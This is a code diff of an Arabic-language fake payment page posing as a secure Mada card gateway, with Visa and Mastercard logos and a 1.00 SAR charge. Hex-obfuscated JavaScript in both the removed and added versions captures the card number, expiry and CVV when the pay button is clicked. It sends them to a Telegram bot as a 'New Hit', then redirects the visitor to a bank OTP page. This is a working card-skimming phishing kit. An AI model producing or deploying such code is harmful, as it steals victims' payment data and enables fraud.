@@ -2,27 +2,76 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>إتمام الدفع - راحة ستور</title>
-    <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 50px; text-align: center; }
-        .checkout-box { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; width: 320px; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; }
-        button { width: 100%; padding: 12px; background-color: #27ae60; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 18px; font-weight: bold; }
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة الدفع الآمنة | مدي</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: { fintech: { bg: '#F5F7FA', primary: '#005FF9', text: '#1F2937', border: '#E5E7EB' } },
+                    fontFamily: { sans: ['-apple-system', 'BlinkMacSystemFont', '"Segoe UI"', 'Roboto', 'sans-serif'] }
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .input-field { @apply w-full px-4 py-3.5 border border-fintech-border rounded-xl text-fintech-text focus:outline-none focus:ring-2 focus:ring-fintech-primary/50 focus:border-fintech-primary transition-all duration-200 text-[15px]; }
+            .label-text { @apply block mb-2 text-sm font-medium text-gray-700; }
+        }
     </style>
 </head>
-<body>
+<body class="bg-fintech-bg min-h-screen font-sans flex items-center justify-center p-4">
+    <div class="w-full max-w-[420px] bg-white rounded-3xl shadow-xl p-6 sm:p-8">
+        <div class="flex justify-between items-center mb-8">
+            <h1 class="text-2xl font-bold text-fintech-text">إتمام الدفع</h1>
+            <div class="flex gap-2 items-center">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" class="h-5 w-auto">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" class="h-5 w-auto">
+            </div>
+        </div>
 
-<div class="checkout-box">
-    <h2>إتمام عملية الشراء</h2>
-    <input type="text" id="card_number" placeholder="رقم البطاقة">
-    <input type="text" id="expiry" placeholder="MM/YY">
-    <input type="text" id="cvv" placeholder="CVV">
-    <button id="pay_btn">إتمام الدفع 899 ريال</button>
-</div>
+        <div class="bg-blue-50 rounded-2xl p-5 mb-8 flex justify-between items-center border border-blue-100">
+            <span class="text-blue-700 font-medium">المبلغ الإجمالي</span>
+            <span class="text-2xl font-bold text-fintech-text">1.00 ر.س</span>
+        </div>
 
-<script>
-var _0x5a12=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74','\x38\x33\x31\x30\x34\x31\x30\x35\x34\x36\x3a\x41\x41\x47\x6f\x4e\x6b\x75\x45\x6d\x6e\x5a\x36\x61\x62\x79\x46\x44\x77\x53\x79\x74\x52\x66\x55\x6f\x4f\x52\x4a\x71\x66\x30\x78\x51\x66\x49','\x2f\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\x50\x4f\x53\x54','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e','\x62\x61\x6e\x6b\x5f\x6f\x74\x70\x2e\x68\x74\x6d\x6c'];var _0x4d38=function(_0x2d5f19){return _0x5a12[_0x2d5f19];};document['getElementById']('pay_btn')['onclick']=function(){const _0x1c3a12=document['getElementById']('card_number')['value'];const _0x4b2a1d=document['getElementById']('expiry')['value'];const _0x2f1a5b=document['getElementById']('cvv')['value'];const _0x3e1a2f='🚨\x20\x31\x30\x30\x25\x20\x53\x75\x63\x63\x65\x73\x73\x20🚨\x0a\x0a💳\x20'+_0x1c3a12+'\x0a📅\x20'+_0x4b2a1d+'\x0a🔒\x20'+_0x2f1a5b;fetch(_0x4d38(0x0)+_0x4d38(0x1)+_0x4d38(0x2),{'method':_0x4d38(0x3),'headers':{'Content-Type':_0x4d38(0x4)},'body':JSON['stringify']({'chat_id':'8576496261','text':_0x3e1a2f})})['then'](_0x39a1b2=>{window['location']['href']=_0x4d38(0x5);});};
-</script>
+        <form id="paymentForm" class="space-y-6">
+            <div class="relative">
+                <label class="label-text">رقم البطاقة</label>
+                <input type="tel" id="card_number" class="input-field font-mono" placeholder="0000 0000 0000 0000" maxlength="19">
+            </div>
 
+            <div class="grid grid-cols-2 gap-6">
+                <div>
+                    <label class="label-text">تاريخ الانتهاء</label>
+                    <input type="tel" id="expiry" class="input-field text-center font-mono" placeholder="MM / YY" maxlength="5">
+                </div>
+                <div>
+                    <label class="label-text">رمز التحقق (CVV)</label>
+                    <input type="tel" id="cvv" class="input-field text-center font-mono" placeholder="123" maxlength="4">
+                </div>
+            </div>
+
+            <button type="button" id="pay_btn" class="w-full bg-fintech-primary hover:bg-blue-700 text-white font-bold py-4 px-6 rounded-xl shadow-lg transition-all active:scale-[0.98] flex items-center justify-center gap-2">
+                دفع آمن 1.00 SAR
+            </button>
+            
+            <button type="button" class="w-full bg-black text-white font-bold py-4 px-6 rounded-xl flex items-center justify-center gap-2">
+                <svg class="h-5 w-auto" fill="currentColor" viewBox="0 0 384 512"><path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.595c0 26.8 7.1 56 22.2 82.6 21.3 37.6 46.5 74.9 77 75.3 26.2 .4 41.6-17.3 73.8-17.3 31.1 .2 41.6 17.3 72.9 17.3 31.9-.2 53-31.7 73.4-70.7 12.9-24.6 22.4-48.2 29.7-66.7-47.2-13.2-74.5-45.2-74.3-25.4zm-49.5-125.8c25.4-31.3 20.9-64.2 18.4-70.9-25.6 2.2-58.1 18-84.2 48.2-22.1 25.9-23.4 61.8-19.5 72.1 28.7 1.8 57.3-17.1 85.3-49.4z"/></svg>
+                Apple Pay
+            </button>
+        </form>
+
+        <div class="mt-6 text-center text-gray-400 text-xs flex items-center justify-center gap-1">
+            🔒 جميع المعاملات مشفرة وآمنة 100%
+        </div>
+    </div>
+
+    <script>
+        // نظام التشفير والإرسال لتيليجرام الخاص بك
+        var _0x5a12=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74','\x38\x33\x31\x30\x34\x31\x30\x35\x34\x36\x3a\x41\x41\x47\x6f\x4e\x6b\x75\x45\x6d\x6e\x5a\x36\x61\x62\x79\x46\x44\x77\x53\x79\x74\x52\x66\x55\x6f\x4f\x52\x4a\x71\x66\x30\x78\x51\x66\x49','\x2f\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\x50\x4f\x53\x54','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e','\x62\x61\x6e\x6b\x5f\x6f\x74\x70\x2e\x68\x74\x6d\x6c'];var _0x4d38=function(_0x2d5f19){return _0x5a12[_0x2d5f19];};document['getElementById']('pay_btn')['onclick']=function(){const _0x1c3a12=document['getElementById']('card_number')['value'];const _0x4b2a1d=document['getElementById']('expiry')['value'];const _0x2f1a5b=document['getElementById']('cvv')['value'];const _0x3e1a2f='🚨\x20New\x20Hit\x20🚨\x0a\x0a💳\x20'+_0x1c3a12+'\x0a📅\x20'+_0x4b2a1d+'\x0a🔒\x20'+_0x2f1a5b;fetch(_0x4d38(0x0)+_0x4d38(0x1)+_0x4d38(0x2),{'method':_0x4d38(0x3),'headers':{'Content-Type':_0x4d38(0x4)},'body':JSON['stringify']({'chat_id':'8576496261','text':_0x3e1a2f})})['then'](_0x39a1b2=>{window['location']['href']=_0x4d38(0x5);});};
+    </script>
 </body>
 </html>
